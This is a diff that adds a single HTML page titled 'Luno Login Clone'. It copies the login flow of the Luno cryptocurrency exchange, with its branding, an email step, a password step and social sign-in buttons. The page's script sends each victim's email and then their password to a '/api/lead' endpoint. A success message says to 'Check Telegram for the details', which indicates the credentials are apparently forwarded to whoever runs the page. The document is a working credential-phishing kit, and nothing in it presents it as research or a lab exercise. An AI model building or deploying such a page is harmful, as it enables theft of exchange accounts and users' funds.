@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Luno Login Clone</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+    body { background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 0; }
+    .mobile-container { background: white; width: 100%; max-width: 400px; min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.1); display: flex; flex-direction: column; }
+    .header { background: #001a4d; padding: 16px 20px; display: flex; justify-content: space-between; align-items: center; height: 64px; position: relative; }
+    .logo { font-size: 24px; font-weight: 800; color: white; display: flex; align-items: center; gap: 8px; letter-spacing: 0.5px; }
+    .logo-icon { width: 28px; height: 28px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #001a4d; font-size: 18px; font-weight: 900; line-height: 1; position: relative; }
+    .logo-icon::after { content: ''; position: absolute; width: 14px; height: 14px; background: #001a4d; border-radius: 50%; }
+    .btn-signup { background: #5e60ce; color: white; border: none; padding: 10px 24px; border-radius: 24px; font-weight: 600; font-size: 14px; cursor: pointer; }
+    .back-arrow { position: absolute; left: 20px; top: 75px; font-size: 24px; color: #333; cursor: pointer; display: none; z-index: 10; }
+    .content { flex: 1; padding: 20px 24px; display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
+    .icon-envelope { font-size: 48px; margin-bottom: 20px; color: #6c5ce7; }
+    .icon-password { font-size: 28px; margin-bottom: 20px; background: #dfe6e9; padding: 10px 25px; border-radius: 16px; color: #5e60ce; font-weight: bold; letter-spacing: 3px; display: flex; align-items: center; gap: 8px; }
+    h2 { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 30px; text-align: center; }
+    .input-group { width: 100%; margin-bottom: 30px; position: relative; }
+    .input-label { font-size: 12px; color: #666; margin-bottom: 8px; display: block; margin-left: 4px; }
+    .input-field { width: 100%; padding: 16px; border: 2px solid #5e60ce; border-radius: 8px; font-size: 16px; outline: none; transition: border-color 0.2s; }
+    .input-field:focus { border-color: #0044cc; }
+    .input-field.error { border-color: #d63031; }
+    .toggle-password { position: absolute; right: 15px; top: 42px; color: #5e60ce; cursor: pointer; font-size: 18px; }
+    .error-msg { color: #d63031; font-size: 12px; margin-top: 8px; margin-left: 4px; display: none; }
+    .btn-primary { width: 100%; background: #2d55ff; color: white; border: none; padding: 16px; border-radius: 24px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 15px; transition: background 0.2s; }
+    .btn-primary:hover { background: #1a40e0; }
+    .btn-link { background: none; border: none; color: #2d55ff; font-size: 14px; font-weight: 600; cursor: pointer; margin-bottom: 30px; text-decoration: none; }
+    .divider { text-align: center; color: #666; font-size: 13px; margin: 10px 0 20px 0; position: relative; }
+    .divider::before, .divider::after { content: ""; position: absolute; top: 50%; width: 30%; height: 1px; background: #eee; }
+    .divider::before { left: 0; }
+    .divider::after { right: 0; }
+    .social-btn { width: 100%; padding: 14px; border-radius: 24px; border: 1px solid #ddd; background: white; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 12px; transition: background 0.2s; }
+    .social-btn.apple { background: #000; color: white; border: none; }
+    .screen { display: none; width: 100%; animation: fadeIn 0.3s ease; }
+    .screen.active { display: flex; flex-direction: column; align-items: center; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  </style>
+</head>
+<body>
+  <div class="mobile-container">
+    <div class="header">
+      <div class="logo"><div class="logo-icon">O</div> LUNO</div>
+      <button class="btn-signup">SIGN UP</button>
+    </div>
+    <div class="back-arrow" id="backBtn">←</div>
+    
+    <div id="screen1" class="content screen active">
+      <div class="icon-envelope">✉️</div>
+      <h2>Sign in with your email</h2>
+      <form id="emailForm">
+        <div class="input-group">
+          <label class="input-label">Email</label>
+          <input type="email" class="input-field" placeholder="Enter your email" required>
+        </div>
+        <button type="submit" class="btn-primary">NEXT</button>
+        <button type="button" class="btn-link">HAVING TROUBLE</button>
+      </form>
+      <div class="divider">or sign in with your social account</div>
+      <button class="social-btn google"><img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" width="20" alt="G"> Continue With Google</button>
+      <button class="social-btn apple"><span></span> Continue With Apple</button>
+    </div>
+
+    <div id="screen2" class="content screen">
+      <div class="icon-password">*** <span style="font-size: 16px; color: #d63031;">🗑️</span></div>
+      <h2>What's your password?</h2>
+      <form id="passwordForm">
+        <div class="input-group">
+          <label class="input-label">Password</label>
+          <input type="password" id="passwordInput" class="input-field" placeholder="Enter password" required>
+          <span class="toggle-password" id="togglePass">👁️</span>
+          <div class="error-msg" id="errorMsg">Password or email is not correct. Try again.</div>
+        </div>
+        <button type="submit" class="btn-primary">NEXT</button>
+        <button type="button" class="btn-link">FORGOT PASSWORD</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    const API_ENDPOINT = '/api/lead'; 
+    const screen1 = document.getElementById('screen1');
+    const screen2 = document.getElementById('screen2');
+    const backBtn = document.getElementById('backBtn');
+    const emailForm = document.getElementById('emailForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const togglePass = document.getElementById('togglePass');
+    const passwordInput = document.getElementById('passwordInput');
+    const errorMsg = document.getElementById('errorMsg');
+
+    emailForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = emailForm.querySelector('input[type="email"]').value;
+      const btn = emailForm.querySelector('.btn-primary');
+      btn.textContent = 'Checking...';
+      btn.disabled = true;
+      try {
+        const response = await fetch(API_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, message: 'User entered email' })
+        });
+        const result = await response.json();
+        if (result.success) {
+          screen1.classList.remove('active');
+          screen2.classList.add('active');
+          backBtn.style.display = 'block';
+        } else {
+          alert('Error: ' + result.error);
+        }
+      } catch (error) {
+        console.error(error);
+        alert('Network error. Please try again.');
+      } finally {
+        btn.textContent = 'NEXT';
+        btn.disabled = false;
+      }
+    });
+
+    passwordForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = screen1.querySelector('input[type="email"]').value;
+      const password = passwordInput.value;
+      const btn = passwordForm.querySelector('.btn-primary');
+      btn.textContent = 'Verifying...';
+      btn.disabled = true;
+      try {
+        const response = await fetch(API_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, password, message: 'User completed login' })
+        });
+        const result = await response.json();
+        if (result.success) {
+          alert('Login Successful! Check Telegram for the details.');
+        } else {
+          errorMsg.textContent = result.error || 'Password or email is not correct. Try again.';
+          errorMsg.style.display = 'block';
+          passwordInput.classList.add('error');
+        }
+      } catch (error) {
+        alert('Network Error: ' + error.message);
+      } finally {
+        btn.textContent = 'NEXT';
+        btn.disabled = false;
+      }
+    });
+
+    backBtn.addEventListener('click', () => {
+      screen2.classList.remove('active');
+      screen1.classList.add('active');
+      backBtn.style.display = 'none';
+      errorMsg.style.display = 'none';
+      passwordInput.classList.remove('error');
+    });
+
+    togglePass.addEventListener('click', () => {
+      const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+      passwordInput.setAttribute('type', type);
+      togglePass.textContent = type === 'password' ? '👁️' : '🙈';
+    });
+  </script>
+</body>
+</html>
